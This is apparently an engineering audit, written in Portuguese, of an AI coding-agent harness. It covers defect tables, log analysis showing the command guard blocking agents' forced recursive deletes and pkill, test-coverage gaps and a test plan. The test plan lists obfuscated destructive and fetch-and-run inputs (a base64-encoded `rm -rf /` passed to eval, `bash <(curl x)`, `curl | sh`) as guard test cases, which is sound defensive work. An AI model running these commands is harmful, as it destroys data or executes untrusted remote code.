| U24 | baixa | performance | `ui-visual/motion/escrita.ts:211` | Cada tick do suavizador chama o `updateContent` nativo com a mensagem inteira cortada, refazendo o lexer do Markdown a ~30 fps enquanto há texto atrasado: O(n²) no stream longo (20 KB ≈ 2–5 ms/tick, estimativa sem medição) (ui) | Aplicar o corte só se o ganho do tick for ≥ N, ou limitar a cadência acima de um limiar | hipótese | corrigido (07: B) |
| U25 | baixa | performance | `ui-visual/motion/marcas.ts:84` (`repoGithub`) | `execFileSync('git', …, {timeout:2000})` no `session_start`: em disco lento o 1º prompt demora até 2 s (ui) | `execFile` assíncrono, preenchendo `repo` ao voltar | hipótese | corrigido (07: B) |
| U26 | baixa | a11y | `code-blocks/syntax.ts:46`, `code-blocks/blocks.ts:23` | Paleta One Dark/Light e `TEXT_COLOR #8b9bb4` fixas, ajustadas só por contraste (≥ 4,5:1) ao fundo, ignorando o tema do usuário; em alto contraste ou daltonismo o realce não acompanha; `NO_COLOR` cai no nativo (ui) | `syntaxPalette` derivada de tokens `syntax*` do tema quando existirem, mantendo o ajuste de contraste | hipótese | corrigido (07: B + sessão principal) |

### Bench

| id | sev | categoria | arquivo:linha | falha concreta | correção mínima | evidência | estado |
|---|---|---|---|---|---|---|---|
| B1 | média | confiabilidade | `bench/run.py:253-258` | `--resume` faz `json.loads` em cada linha de `runs.jsonl` sem `try`: se o processo morreu escrevendo a última linha, o resume (feito para esse caso) quebra com `JSONDecodeError` (pc 5) | Ignorar linhas que não decodificam e registrar quantas | reproduzido (`/tmp/runs.jsonl` truncado) | corrigido (07: D) |
| B2 | média | confiabilidade | `bench/run.py:279-280` | Resume reescreve `runs.jsonl` por `write_text` direto e `_kept_runs` descarta runs com erro, inclusive as de `cost_usd` > 0: morte entre truncar e gravar perde todas as runs pagas; o gasto das runs com erro some de `spent` e `meta.json` e o teto de orçamento é furado (pc 6) | `.tmp` + `os.replace`; somar o custo de todas as runs anteriores em `spent` | hipótese | corrigido (07: D) |
| B3 | média | confiabilidade | `bench/runners.py:536-556` | `subprocess.run(timeout=…)` mata só o filho direto: netos (bash das ferramentas, subagentes, `harbor`) seguem vivos gastando modelo; a run é registrada como timeout com custo parcial (pc 7) | `Popen(start_new_session=True)` + `os.killpg`, como `gd_common.run_file` | hipótese (falha não injetada) | corrigido (07: D) |
| B4 | média | confiabilidade | `bench/runners.py:139`, `:148`, `:375` (orçamento `:360-361`) | `run_s1` e `run_harbor` chamam `subprocess.run` sem timeout: filho pendurado trava a rodada; no harbor o orçamento só é conferido entre blocos de 4 tarefas, então um bloco pode ultrapassar o saldo (`harbor_cmd` não recebe o teto) (pc 8) | `timeout=` por etapa e passar o saldo restante ao `harbor`, se aceitar | hipótese | corrigido (07: D) |
| B5 | média | confiabilidade | `bench/run.py:411-415`, `:441-447` | `_extend` roda com `check=False` e sem timeout; o veredito é recalculado com `extended=True` mesmo sem `runs.ext.jsonl`: INCONCLUSIVE "estendido" sem dados novos (pc 9) | Verificar `returncode` e a existência de `runs.ext.jsonl`; senão `extended=False` com aviso | hipótese | corrigido (07: D) |
| B6 | baixa | performance | `bench/run.py:196-215` | `bundle.sh` roda de novo para cada etapa Harbor, mesmo com o mesmo `short`; custo não medido (pc 21) | Guardar o `short` empacotado e pular se igual | hipótese | corrigido (07: D) |
| B7 | baixa | confiabilidade | `bench/runners.py:60-64` | `is_infra` trata como infra toda run com erro e `cost_usd` vazio; `timeout` legítimo sem evento `result` entra: 5 seguidos (`INFRA_STREAK`) abortam a etapa como "infra suspeita" (pc 22) | Contar `timeout` como falha de tarefa | hipótese | corrigido (07: D) |

### Entrega git

| id | sev | categoria | arquivo:linha | falha concreta | correção mínima | evidência | estado |
|---|---|---|---|---|---|---|---|
| E1 | média | confiabilidade | `claude-home/skills/atualizador/scripts/gd_common.py:135-160` (`Ctx.run`; prazos em `gd_git.py:344` 600 s e push 300 s) | `subprocess.run(timeout)` mata só o filho: `git commit` com hook ou `git push` que estoure o prazo deixa o hook órfão rodando enquanto o `flock` do repositório é solto; reexecução comita ou empurra em paralelo (pc 12) | Padrão de `run_file`: `start_new_session=True` + `killpg` | hipótese | corrigido (07: C) |

## Análise de logs

Fonte: `faixas/logs.md`. **Janela:** `diag.jsonl.1` + `diag.jsonl`, 2026-11-16T08:59 a 2026-11-19T07:02 UTC, 1.137
eventos não-INFO; antes de 11-16 foi rotacionado e perdido. Traces só de 11-19T01:14 em diante (quase todos depois do
corte de 11-18T22:00). "48h" = desde 11-17T07:04; "pós" = depois de 11-18T22:00. Cobertura degradada (rg, jq, awk).

### Erros e avisos por tipo

| tipo | total | 48h | pós | primeira/última | causa provável |
|---|---|---|---|---|---|
| bash timeout acima do teto | 75 | 71 | 24 | 11-16 08:59 / 11-19 01:38 | harness: briefs de git-delivery (50), gate-runner (6), swarm-worker pedem 2.000–3.600 s (3000 s ×36); recusa em `bash-timeout/index.ts:35`, teto `:25` |
| read ENOENT `$CLAUDE_CONFIG_DIR/docs/agent-contract.md` | 101 | 98 | 35 | 11-16 18:30 / 11-19 02:18 | harness: variável literal que o `read` não expande (swarm-worker 41, gate-runner 15, plan-reviewer 12, security-reviewer 7, Explore 7) |
| guard: rm recursivo forçado | 41 | 41 | 33 | 11-17 13:33 / 11-19 03:39 | guard correto (`guard.py:205`); swarm-worker 29, web-platform-engineer 4, plan-reviewer 4 repetem o comando |
| guard: `pkill -f` que casa com o próprio shell | 10 | 9 | 4 | 11-16 / 11-19 02:59 | guard correto; o agente repete |
| 429 `rate_limit_error` | 143 | 71 | 21 | 11-16 17:22 / 11-19 05:10 | externa: cota da conta |
| "quota exceeded", auto-resume | 65 | 56 | 17 | 11-16 17:23 / 11-19 05:10 | externa: cota |
| ChatGPT/Codex usage limit | 15 | 11 | n/d | 11-16 / 11-19 | externa: cota |
| Compactação falhou (Codex limit) | 6 | 1 | 0 | 11-16 16:01 / 11-18 21:03 | externa: cota |
| `EAI_AGAIN api.anthropic.com` | 30 | 26 | 26 | 11-16 09:28 / 11-19 02:18 | externa: rede/DNS (as 26 pós são do mesmo surto) |
| retry "falha no pi" | 17 | 16 | 16 | 11-16 15:55 / 11-19 00:01 | externa, junto da rede |
| retry "sem conexão" | 6 | 2 | 0 | 11-16 / 11-18 19:53 | externa |
| hook `Status` timeout (5 s) | 29 | 27 | 23 | 11-16 15:55 / 11-19 02:18 | máquina sobrecarregada (hipótese); hook do harness |
| detector tool-travada | 22 | 21 | 10 | 11-16 14:33 / 11-19 02:58 | bash 15, subagent 5, question 2 |
| detector modelo-lento | 15 | 13 | 7 | 11-16 13:12 / 11-19 03:11 | provedor lento |
| detector tool-em-laço | 8 | 7 | 3 | 11-16 08:59 / 11-19 01:19 | consequência de timeout e ENOENT |
| Plan mode: comando bloqueado | 12 | 12 | 8 | 11-17 20:10 / 11-18 23:24 | comportamento esperado |
| Traceback / Command timed out | 7 / 14 | 7 / 12 | 3 / 4 | 11-16 / 11-19 | comandos dos próprios agentes |

Falso positivo de classificação: ~100 WARN `tool:bash` têm como corpo a saída normal (`(no output)`, `uptime`,
código-fonte, `✔ launcher lists…`).

### Latências (traces desde 11-19T01:14)

| ferramenta | n | p50 | p95 | observação |
|---|---|---|---|---|
| bash | 1.158 | 198 ms | 115 s | máx. 1.200 s |
| read | 125 | 6 ms | 118 ms | |
| subagent | 22 | 40 ms | 136 s | máx. 210 s |
| write | 6 | 33 ms | 42 ms | amostra pequena |
| edit | 2 | 50 ms | 50 ms | amostra mínima |
| MCP | 0 | n/d | n/d | nenhum span de MCP nos traces |

- 10 chamadas mais lentas, todas `bash` (11-19T01:59 a 03:00): 1.200, 1.017, 900, 742, 731, 600, 541, 411, 345, 305 s.
- Chat: p50 3,6 s, p95 18,7 s, máx. 122 s.
- Span `pi.hook Status`: sempre 0 ms em 3.549 amostras, apesar dos timeouts do mesmo hook no diag.
- MCP: Exa 402 de créditos (5 `web_search_exa` + 1 `web_fetch_exa`, 11-17T14:19 a 11-18T22:52; 1 alerta "falhou N vezes
  seguidas"); Keenable `Tool mcp__keenable__search_web_pages not found` 1 vez (perplexity-scout); 1 `target_blocked`;
  sem 429, timeout ou login de MCP; `~/.pi/agent/mcp.log` só tem youcom, parado em 11-15.
- Custo: nenhum valor em dólar medido. Turnos / saída por turno / cacheRead por turno: opus-5-5 474 / 858 / 151 mil;
  sonnet-5-5 861 / 471 / 75 mil; fable-5-2 72 / 1.594 / 133 mil. Sem sinal de cache miss; `cache_creation` não é
registrado (zero), então o custo de escrita é desconhecido. 4 `session_compact` (todos por `threshold`), 23
  `modelo/retry`.

### Diagnóstico F1–F6 de `docs/perf-sota.md`: o que ainda ocorre (depois de 11-18T22:00)

| F | situação |
|---|---|
| F1 (latência de `edit`/`write` por espera fixa do LSP) | Não evidenciado: `edit` 50 ms e `write` 33 ms, mas n=2 e n=6 |
| F2 (`$CLAUDE_CONFIG_DIR` literal no `read`) | **Ocorre**: 35 ocorrências. Os `.md` de agentes no repositório já dizem `~/.pi/...` (modificados, sem commit); a origem do literal (brief do pai ou cópia viva fora do repositório) não foi confirmada |
| F3 (teto de timeout de 1800 s) | **Ocorre**: 24 recusas e 3 laços |
| F4 (CPU do processo `pi`) | Não avaliável nos logs |
| F5 (`question` como "tool travada") | Parcial: `question` já isenta em `trilha.ts:138`, último alerta 11-18T15:09; `subagent` também isento, mas houve 5 alertas de subagent no total |
| F6 (cartão 08 só validado no mock) | Não avaliável nos logs |

### Defeitos do harness evidenciados pelos logs

| id | sev | categoria | arquivo:linha | falha concreta | correção mínima | evidência | estado |
|---|---|---|---|---|---|---|---|
| L1 | média | bug (briefs) | texto dos agentes/briefs; origem não confirmada (n/d) | `$CLAUDE_CONFIG_DIR/docs/agent-contract.md` literal no `read`: 101 ENOENT (35 pós-corte), uma chamada perdida por subagente | Trocar o texto para `~/.pi/agent/claude-home/docs/agent-contract.md` (A4 de `perf-sota.md`) e não depender de expansão | observado (logs) | corrigido (07: F) |
| L2 | média | bug (briefs) | `extensions/bash-timeout/index.ts:25` (teto), `:35` (recusa) | Briefs de git-delivery (50), gate-runner, swarm-worker e web-platform-engineer pedem timeout > 1800 s: 75 recusas (e 8 alertas de "tool em laço" no total) | Corrigir os briefs para `run start`/segundo plano; o teto fica | observado | corrigido (07: F) |
| L3 | baixa | comportamento do agente | `guard.py:205` | swarm-worker tenta `rm -rf` (29 bloqueios) sem alternativa; o guard está certo | Brief/agente orientar a remoção sem `-f` recursivo | observado | corrigido (07: F) |
| L4 | baixa | comportamento do agente | `guard.py` (regra de `pkill -f`) | Agentes repetem `pkill -f` bloqueado (10) | Idem L3 | observado | corrigido (07: F) |
| L5 | baixa | observabilidade | `extensions/diagnostico/` (classificação de eventos; linha n/d) | ~100 WARN `tool:bash` com a saída normal do comando como corpo | Registrar WARN só com erro real do bash | observado | não reproduz (07: WARN só com saída ≠ 0) |
| L6 | média | observabilidade | span `pi.hook Status` (linha n/d) | Sempre 0 ms em 3.549 amostras, embora o diag registre 29 timeouts do mesmo hook: o span não mede a duração real | Medir a duração real do hook | observado | corrigido (07: A2) |
| L7 | baixa | observabilidade | spans `chat` (linha n/d) | `cache_creation` não é registrado: o custo de escrita de cache é desconhecido | Registrar o campo | observado | corrigido (07: A2) |
| L9 | baixa | observabilidade | detector de tool em laço (arquivo n/d) | Detector de tool em laço só avisa (8 ocorrências); a causa não é interrompida | Interromper ou escalar após N falhas iguais (proposta; a faixa não indica correção) | observado | corrigido (07: A2; conta só resultado idêntico, revisão) |
| L10 | baixa | comportamento do agente | n/d | Bash de ≥ 20 min em primeiro plano (top 10 todos > 5 min) apesar do aviso de usar `run start` | Reforçar o aviso nos briefs | observado | corrigido (07: F) |
| L11 | baixa | confiabilidade | registro do MCP (linha n/d) | `mcp__keenable__search_web_pages not found` 1 vez em perplexity-scout, embora declarado direto: pode ser falha de registro | Investigar o registro | observado; causa hipótese | não reproduz no texto (07: F; nome correto, suspeita de registro do MCP) |
| L12 | baixa | comportamento do agente | n/d | Agentes insistem no Exa após o 402 (6 falhas + 1 "falhou N vezes seguidas") | Orientar a trocar de provedor após 402 | observado | corrigido (07: F) |

(Retenção do diag (1 geração, ~3 dias) e hook `Status` com 29 timeouts (23 pós) são tratados em F14, S8, U18 e U19
e no span L6; não viram linhas próprias.)

**Causas externas (não são defeitos do harness):** 429 e cota da conta (143 + 65); limite ChatGPT/Codex (15);
compactação falhando por cota (6); `EAI_AGAIN` e retries de rede (30 + 17 + 6); Exa 402 (créditos); fetch bloqueado
pelo alvo. A nota sem defeito do ny-pi continua valendo para 429, compactação por cota, Exa 402 e timeouts do hook.

### Higiene de disco

| item | medida | observação |
|---|---|---|
| sessions | 522 MB (34 arquivos) | sem rotação |
| checkpoints | 382 MB (1.871 diretórios; 1.755 com `logs`); pc: 384 MB / 1.880 | poda de 30 dias do pi-code (`git-checkpoint.ts:68,124,288`), nada com mais de 14 dias: não é achado nosso |
| diag | 7,9 MB | 1 geração de 1 MiB (`registro.ts:30,47`) |
| inbox | 29 arquivos, 672 KB (log); pc: 34 arquivos, 9,4 MB | 26 com PID morto, o mais antigo de 11-14; só 3 PIDs vivos (1917162, 2194111, 3935857). Os números divergem entre faixas por data/escopo de medição (ver S8) |
| pi-transcripts (hud) | 3.352 arquivos, 80 MB | ver S7 |
| `cache/`, `tmp/` | não existem | |

Telemetria de 11-16: `currency.json` com 14 pacotes defasados, 4 ausentes, 0 erros; scan de skills (`plugin-skills.txt`)
cobriu 444 skills com 524 achados (15 críticos e 14 altos), não lidos.

## Cobertura de testes

Fonte: `faixas/testes.md`. **Veredito da faixa: insufficient** (mapa estático; nenhuma suíte, nenhuma contagem
passed/failed/skipped). Não há relatório de cobertura em disco (`coverage/`, `.coverage`, `lcov`); o único
`coverage.json` (`docs/ui-ux-gallery/`) é um mapa de telas. `.project-phase` não existe: fase `launched`.

### Como roda hoje (CI)

Workflows: `ci-static`, `ci-security`, `instruction-budget` e o job informativo `ci-mutation` (em `ci-static.yml`);
tudo via `scripts/ci/run-static.sh`.

| linguagem | comando no CI | medição e limiar |
|---|---|---|
| Python | `coverage run -m pytest scripts/ claude-home/hooks claude-home/bin bench` | `source=.` (arquivo não importado conta 0 %); 80 % só por `diff-cover --fail-under 80` nas linhas alteradas; sem piso por arquivo nem agregado |
| TypeScript/MJS | `node --test` em `extensions/**/*.test.ts` e `claude-home/bin/**/*.test.{ts,mjs}` | nenhuma medição de cobertura |
| Shell | só `scripts/test_install.sh` (casos offline) | sem cobertura |
| Estático | ruff, mypy `--strict`, biome, shellcheck, shfmt, markdownlint, limites de estrutura | só arquivos alterados; legado nunca bloqueia |
| Segurança | actionlint, zizmor, gitleaks, trufflehog, semgrep, osv-scanner, pins de SHA | n/a |
| Mutação | mutmut só em `.py` alterados | sem `scripts/ci/mutmut-baseline.json`: só informativo |

Excluídos de propósito do job Node: `cache-warm-identity`, testes do HUD de statusline, o de pi-transcript e o e2e do
antigravity.

### O que o CI não executa nem mede

- 48 testes Node em `claude-home/patches/pi-code/**` e 7 em `claude-home/patches/pi-core/**` (inclui `wrapper.test.mjs`,
  que testa `pi_permission_env` de `bin/pi`, e os de `permission-control`, `plan-state`, `subagent-routing`).
- 13 arquivos pytest em `claude-home/skills/*/scripts/tests` (6 do `atualizador`/git-deliver: `test_core`, `test_merge`,
  `test_ship`, `test_publish_ci`, `test_sync_cleanup`, `test_integrate_gate`; `test_compaction_restart`; `deep-search`;
  `test_doces`; `test_unit_graph`; `test_pipeline`).
- Scripts de shell de teste: `bin/test_pi_env.sh`, `supervisor.test.sh`, `test_supervisor.sh`,
  `bench/tools/test_tools.sh`,
  `acceptance/*.sh` do claude-compat, `terminal-sota/*.sh`, `bin/ny-pi-mock-src/e2e.test.mjs`.
- ~270 arquivos TypeScript sem limiar de cobertura: o contrato de 80 % por arquivo é `not_verified` para eles.
- O trecho de rede de `scripts/test_install.sh` (só com `PI_HARNESS_E2E_NET=1`).
- Nenhum gate verifica red-then-green de bug fix.

### Arquivos sem teste correspondente ou com teste raso, por risco

"Teste existente?" vem de busca por nome e leitura de casos, não de cobertura medida.

| risco | arquivo | linhas | teste existente? | o que falta testar |
|---|---|---|---|---|
| alto | `bin/pi` (além de `pi_permission_env` e `pi_load_local_env`) | 388 | Parcial: `test_pi_env.sh` só cobre o loader do `local.env` e não roda no CI; `pi_permission_env` está em `patches/pi-core/editor-actions/wrapper.test.mjs`, fora do CI | `*_ready` de ui-controls, session-cwd, avisos, retomada e scrollbar (marcador presente com runtime divergente chama `apply.mjs`; patch que falha avisa e segue); versão ≠ 1.5.2 não aplica patch; `--safe`/`--bypass`; `PI_PERMISSION_MODE` inválido dá erro; `--exclude-tools web_search` sempre presente; fallback sem supervisor |
| alto | `claude-home/hooks/guard.py` + `permissions/*` | 520 + 475 | Boa (`test_guard.py` 370, `test_guard_modes` 202, `test_hardening` 160, `test_units` 157); lacunas por busca de padrões: `eval`, `base64`, `NotebookEdit`, fork bomb estruturado | `eval "$(echo … \| base64 -d)"` nunca allow; `NotebookEdit` em arquivo sensível; `rm -rf` por `$(...)` ou variável; `curl \| sh` com wrapper; comando muito longo ou com NUL |
| alto | `claude-home/hooks/claims/claims.py` | 254 | Nenhum: o docstring cita `tests/test_claims.py`, que não existe, e `cade_o_print.py` e `replay.py` também faltam | "testes passam" com e sem evidência no ledger; ledger vazio/corrompido; `ok=false` não vale; edição depois do teste invalida; truncamento por `TAIL`; paridade `record()` × ledger em bash |
| alto | `scripts/install-lib.sh` + `install.sh` | 210 + ~150 | Parcial: `test_install.sh` (75 linhas) cobre commit adulterado, pin errado, `--link`, `--apply`, `--restore` | `fetch_git`/`fetch_npm` (integridade npm e sha256 da licença divergentes); `safe_rel` com `..`/absoluto; patch que não aplica falha fechado sem escrever; `--restore` com backup ausente/parcial; `--apply` idempotente; `install_pi_core`, `write_launcher` |
| alto | `claude-home/skills/atualizador/scripts/*.py` (git-deliver) | 158+214+143+399+155+276+424 | Existe (~2.800 linhas de teste) mas fora do CI; `gd_gate.py` (143) não é citado em teste algum | Rodar no CI; em `gd_gate`: gate que falha/estoura, head ≠ SHA do proof; merge com CI vermelho ou SHA velho recusa; `--admin` nunca; falha de rede do `gh` |
| médio | `extensions/compact-at-400k.ts` | 138 | Nenhum (`parseTokens`, `condensePrevious` puros) | `parseTokens`: `"400k"`, `"1,5m"`, `"0"`, `"-1"`, `"1e3"`, vazio, `"9999999999999999999"`; `condensePrevious` na borda `max`; `/contexto` abaixo do mínimo ou ≥ janela avisa e não grava; `agent_settled` com `aborted`/`running` não recompacta; `onError` zera `running`; `session_start` restaura o limite (liga a F2/F3) |
| médio | `extensions/plan-gate.ts` | 241 | Sim (`claude-home/bin/tests/plan-gate.test.ts`, 30+ casos) só com `decidePlanGate` e handler mockado; paridade com `done-view.ts` pula sem pi-code | Sessão retomada com estado em outro ramo; duas revisões `complete` com edição entre elas (F6); garantir que a paridade não pula em silêncio no CI |
| médio | `extensions/completion-gate.ts` | 130 | Sim (13 casos) | Edição só de arquivo de teste; `isCheckCommand` com substituição de comando e `time`/`env` à frente; edições em ramos paralelos; bloqueio com > 1 turno sem resposta |
| médio | `extensions/auto-resume/index.ts` | 344 | Sim (19 casos, clock e sleep injetados) | `limitReset` com header em segundos × ms × data HTTP; aborto durante a espera de 600 s; reentrada com dois erros simultâneos |
| médio | `claude-home/bin/lifecycle/supervisor.sh` | 114 | Existe, mas shell e fora do CI | Rodar no CI; `/restart` com filho morto por sinal; sem TTY, caminho `exec` |
| médio | `scripts/compaction-400k.py` | 37 | Nenhum; reescreve `~/.pi/agent/settings.json` e roda no import | Em HOME temporário: janela = limite + 16384 (borda), `models-store.json` ausente/malformado, `settings.json` sem `compaction`, 2ª execução igual |
| médio | `extensions/travar-modelos/*` | 336 | Sim (5 + 17 casos), falha fechada | Aceitável; só concorrência entre `model_select` e `/travar` |
| médio | `claude-home/hooks/dispatch/hook-dispatch.sh` | 226 | Sim (`test_dispatch.py`) | `PI_DIAG_INBOX` não gravável; payload JSON gigante |
| baixo | `extensions/puxar.ts` | 88 | Nenhum para o `.ts` (`test_puxar.py` só cobre `puxar.py`) | Argumentos inválidos; falha do subprocesso |
| baixo | `extensions/cache-prefix-probe/index.ts` | 58 | Nenhum | Prefixo estável × variável; probe desligado (`diff()` é pura) |
| baixo | `extensions/no-web-search.ts` | 18 | Nenhum | `web_search` continua fora das ferramentas ativas |
| baixo | `extensions/footer-no-stats.ts` | 44 | Só indireto, em `patches/pi-code/statusline-multiline.test.ts` (fora do CI) | Render do rodapé sem estatísticas; filtro de `HIDDEN` |
| baixo | `scripts/check-leaks.sh` | 220 | Só `--selftest` no `ci-security` | Padrão de identificador pessoal e falso positivo |
| baixo | `extensions/claude-compat/vim/motions.ts` | 267 | Indireto (`engine.test.ts`) | Aceitável |
| baixo | `code-blocks/index.ts` (`remember`, `highlighted`, `themePalette`, `syntaxPalette`, `copyBlock`, `hookClicks`, `renderToken`) | n/d | Nenhum; `blocks.test.ts` e `syntax.test.ts` cobrem só a lógica pura (ui) | Com `Markdown` falso: stream de 600 prefixos não expulsa o bloco 1; rótulo de 80 colunas não passa de `width` (liga a U1–U3) |
| baixo | `sticky-prompt/index.ts`, `chat-margin/index.ts`, `ui-visual/motion/vivo.ts`, `calm-statusline.mjs` (`gitState`, `ctxHistory`) | n/d | Sem teste de integração de `attach`/`findBox`/`hookDocument`; `grep gitState` em `hud/tests` vazio (ui) | `gitState` com `git` falso lento; ordem chat-margin→compact no mesmo contêiner; leak de `inicio` em `vivo.ts` |
| baixo | `port-agents.py`, `fonte-icones.py`, `cache-misses.sh`, `mcp-header.sh`, `bench/tools/bench-nightly.sh`, `bench/arms/oauth-token.sh`, `scripts/ci/{changed-files,install-tools}.sh`, `extensions/code-blocks/gen-languages.py` | 117, 45, 35, 10, 43, 13, 12, 52, 64 | Nenhum por busca de nome | Baixo risco; `oauth-token.sh` e `mcp-header.sh` lidam com credenciais: testar que nunca imprimem o token |

### Testes frágeis

- **Pulados** (nenhum `.only` nem `.todo`; só condicionais): `claude-home/bin/tests/plan-gate.test.ts:228` e
  `extensions/claude-compat/lifecycle/test/terminal-setup.test.ts:226` sem o pi instalado (o mais arriscado: skip
  silencioso esconde a paridade do plan-gate); `patches/pi-code/permission-control/apply.test.ts:131` sem pi-code;
`patches/pi-core/scrollbar-imagem/apply.test.mjs:41` sem `layout.js`;
  `patches/pi-code/subagent-panel/fleet-faults.test.ts:20`
  e `claude-home/bin/structure/test_structure.py:197` como root; `extensions/ui-visual/test/theme-contrast.test.ts:52`
  (tema `mono` fixo, sem alternativa); `claude-home/skills/atualizador/scripts/tests/test_core.py:640` sem gitleaks;
  `claude-home/skills/doces-ou-travessuras/scripts/tests/test_doces.py:350` sem `hook-dispatch.sh` instalado. As linhas
  `test_doces.py:169,170,212,256` são dados de fixture, não skips.
- **Sleeps e tempo real:** `patches/pi-code/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzz-fleet-sync/fleet-sync.test.ts:53` (1100 ms),
  `reload.test.ts:107` (50 ms) e `:122` (400 ms); `extensions/ui-visual/test/tools/estado.test.ts:90` (300 ms);
`zzzzzzzzzzz-subagent-routing/integration.test.ts:206` (300 ms);
  `zzzzzzzzzzzzzzz-run-section/run-section.test.ts:153,166,234`
(150, 200, 300 ms); `subagent-panel/fleet-entry.test.ts:217` (500 ms); `extensions/ui/test/terminal.test.ts:127` (150
  ms);
  `supervisor.test.sh` e `bench/tools/test_tools.sh:110-111` (`sleep 2`, `sleep 0.5` para orquestrar `flock`);
`setTimeout(…, 5–50 ms)` em `extensions/auto-resume/index.test.ts:302`, `extensions/comandos/test/index.test.ts:76,80`,
`fleet-spawn.test.ts:38`, `send.test.ts:424`; `auto-resume/index.test.ts:308` com `Promise.race` de 1500 ms. O contador
  `now` do auto-resume é injetado (bom). Flakiness só inferida pelo padrão; nada executado.
- **Dependência de HOME e do ambiente real:** `claude-home/hooks/test_guard.py:11`,
  `permissions/tests/test_guard_modes.py:15`
  e `claude-home/bin/tests/plan-gate.test.ts:226` usam `expanduser("~")`/`homedir()` (o guard compara com o HOME real; o
  plan-gate lê o pi-code instalado: resultado difere entre máquina e CI). Vários testes de `patches/pi-code/**` e
  `patches/pi-core/**` (`permission-control`, `session-cwd`, `ui-controls`, `rules-notice`, `onda5`) e de
`extensions/**/test/` (`ui`, `ui-visual`, `folha`, `diagnostico/carregar.ts`, `avisos`, `dev-commands`) usam
  `homedir()`;
  falta verificar se trocam HOME. `bin/test_pi_env.sh` usa `/tmp/pwned` fixo com `rm -f` prévio (colide com outro
  processo). `claude-home/bin/tests/pi-ui-final-gate.sh` e `terminal-sota/*.sh` dependem do ambiente.
- **Asserções fracas (só "não lança"):** `extensions/diagnostico/test/index.test.ts:188`, `registro.test.ts:69`,
`obs/trilha.test.ts:87-88`, `obs/detector.test.ts:148`;
  `patches/pi-code/subagent-panel/fleet-faults.test.ts:169,187,202,
  213,223,232`; `todo-collapse.test.ts:71,225`, `rewind-tree.test.ts:292,525`, `run-section.test.ts:98`;
  `claude-home/bin/tests/interactive-display/plan-section.test.ts:630-635`. Conferir se há asserção de estado depois de
  `doesNotThrow`.
- Rede: nenhum teste faz rede por padrão (`PI_HARNESS_E2E_NET=1` isolado em `test_install.sh`). Fuso: nenhum teste
  dependente encontrado.

### Violações de estrutura

`structure.py --project-root . --json`: 802 arquivos de código, **0 findings** (0,1 s). Conferência manual nos 767
arquivos rastreados ts/mjs/js/py/sh: nenhum arquivo > 800 linhas e nenhum diretório > 7 arquivos de código diretos.
Maiores: `extensions/ui-visual/tools.ts` (727), `extensions/diagnostico/index.ts` (711), `bench/run.py` (679); `bin/pi`
(388) e outros scripts sem extensão não entram na contagem do verificador. Atenção de `02`: `claude-home/hooks/` já tem
7 arquivos de código diretos (limite atingido). Os 802 (verificador) e 767 (conferência) diferem por escopo; a faixa
não explica a diferença.

### Plano de testes priorizado (15 itens)

1. Rodar no CI os testes hoje ignorados: `claude-home/skills/*/scripts/tests`, `claude-home/patches/**/*.test.*`,
   `bin/test_pi_env.sh`, os `.sh` de lifecycle (`pytest claude-home/skills` e `node --test` com o glob de `patches/`):
   ~70 arquivos passam a valer; maior ganho.
2. Falhar em `CI=true` se `done-view.ts` não existir (`plan-gate.test.ts:228`): paridade do plan-gate não pula.
3. Cobertura de TypeScript: `node --test --experimental-test-coverage` ou c8 com 80 % por arquivo.
4. Piso por arquivo no pytest: `coverage report` por arquivo com `--fail-under=80` (ou script sobre o XML) além do
   `diff-cover`.
5. `hooks/claims/test_claims.py`: edit→test(ok=false)→claim "testes passam" sem evidência; edit→test(ok=true)→claim
   passa; edit depois do test invalida.
6. `compact-at-400k`: `parseTokens` (`"400k"`=400000, `"0"`, `"-5"`, `"abc"`, `"1,5m"`=1500000), `condensePrevious` com
   `previousSummary.length` = `max` e `max+1`, `onError` zera `running`.
7. `pi_permission_env` no CI (já existe em `wrapper.test.mjs`; basta o item 1): `PI_BYPASS_PERMISSIONS=1` sem
   `PI_BYPASS_ELIGIBLE`/`PI_BYPASS_OPTIN` fora do estado "querido" resulta em 0 (falha fechada).
8. `guard.py` com ofuscação: `eval "$(echo cm0gLXJmIC8= | base64 -d)"`, `bash <(curl x)`, `x=rm; $x -r /`: nunca allow
   (U1 já o cobre para os casos de G1–G8).
9. `install-lib.sh`: `third-party.json` com `dest` `../x` aborta sem escrever; npm com integrity errada aborta;
   sha256 da licença divergente aborta.
10. `compaction-400k.py` em HOME temporário: janela = `LIMIT + 16384` fora dos overrides; `LIMIT + 16385` dentro com
    `reserveTokens = 16385 + ...`; `models-store.json` ausente falha com mensagem sem tocar `settings.json`.
11. `gd_gate.py`: gate com exit ≠ 0 impede o merge; proof de SHA diferente do head atual recusa.
12. `test_pi_env.sh`: trocar `/tmp/pwned` por caminho em `mktemp -d`, sem `rm -f` prévio.
13. Fixar HOME temporário em `test_guard.py` e `test_guard_modes.py` (via `env` na chamada do hook).
14. Trocar sleeps por sinal controlado em `fleet-sync.test.ts:53` (1100 ms) e `estado.test.ts:90` (300 ms).
15. Teste de contrato para `no-web-search.ts`, `cache-prefix-probe`, `puxar.ts`, `footer-no-stats.ts`.

Estado: 1, 2, 5 e 9–15 executados (`07`, blocos C e E); 3 e 4 só medem e publicam, sem bloquear (decisão em `07`);
6 na unidade A1; 7 entra pelo item 1; 8 na U1 (`02`).

## Atualidade de dependências

Fonte: `faixas/atualidade.md` (acesso 2026-11-19; registro npm lido direto; PyPI e Actions via
`mcp__package_version_check`; fontes por linha no relatório bruto). **Correção da faixa ao pedido:** o pi-code estável
mais recente é a **1.10.1** (2026-11-17), não a 1.9.0 do scanner de 11-16. Nada foi instalado nem alterado.

| item | no repo | mais recente (data) | lacuna relevante? | risco | rollback |
|---|---|---|---|---|---|
| pi-code | 1.7.0 (`npm/package.json:5`, lock, `install-lib.sh:7`, `settings.json.example:4`) | **1.10.1** (2026-11-17) | Sim (a); sem CVE novo | alto: 12 dos 74 arquivos patcheados quebram | pin 1.7.0; `npm ci` do lock |
| pi core | 1.5.2 (`install-lib.sh:6`) | 1.5.2 (2026-11-10) | Não, atual | – | – |
| pi-lsp | 0.1.7 + patch local | 0.1.8 (2026-11-17) | Talvez (recuperação de cliente/shutdown; diff não lido) | médio | re-pin 0.1.7 |
| ponytail | commit ef8ca48 (v4.10.3) + patch | v5.3.3 (2026-10-29) | Major; notas e compatibilidade do patch não verificadas | alto | commit atual |
| ralph-loop / pr-review-toolkit | commit 893173f | `main` df9699a (2026-11-19); sem releases | Não avaliado | baixo | commit atual |
| computer-use-linux | 0.7.53 global, não pinado | 0.7.56 (2026-11-17) | changelog 0.7.54–0.7.56 não lido | baixo | `npm i @0.7.53` |
